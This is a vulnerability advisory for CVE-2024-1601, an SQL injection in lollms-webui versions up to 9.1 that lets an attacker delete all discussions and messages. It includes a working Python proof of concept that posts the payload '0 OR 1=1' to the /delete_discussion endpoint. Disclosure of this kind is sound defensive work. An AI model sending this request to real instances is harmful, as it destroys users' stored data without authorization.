---
description: CVE-2024-1601, HIGH, SQL Injection in lollms-webui leads to denial of service
title: lollms-webui SQLi DoS
date_published: "2024-04-15"
last_updated: "2024-04-15"
xray_id: JFSA-2024-001028813
vul_id: CVE-2024-1601
cvss: 7.5
severity: high
discovered_by: Naveh Racovsky
type: vulnerability

---

## Summary

SQL Injection in lollms-webui leads to denial of service

## Component

[parisneo/lollms-webui](https://github.com/parisneo/lollms-webui)

## Affected versions

(,9.1], Fixed in 9.2

## Description

An SQL injection condition exists in `delete_discussion()`, allowing a malicious actor to delete all discussions and message data from the application. This vulnerability can simply be exploited by sending a crafted HTTP POST request to the `/delete_discussion` which will call the vulnerable internal `delete_discussion()` function.

## PoC

```bash
// PoC.py
import requests

IP_ADDRESS = "aaa.bbb.ccc.ddd" #replace me
PORT = 9600

data = {
    "id": "0 OR 1=1",
    "client_id": 0
}
response = requests.post(f"http://{IP_ADDRESS}:{str(PORT)}/delete_discussion", json=data)
print(response.json())
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[Advisory](https://huntr.com/bounties/652a176e-6bd7-4161-8775-63a34ecc71d5)

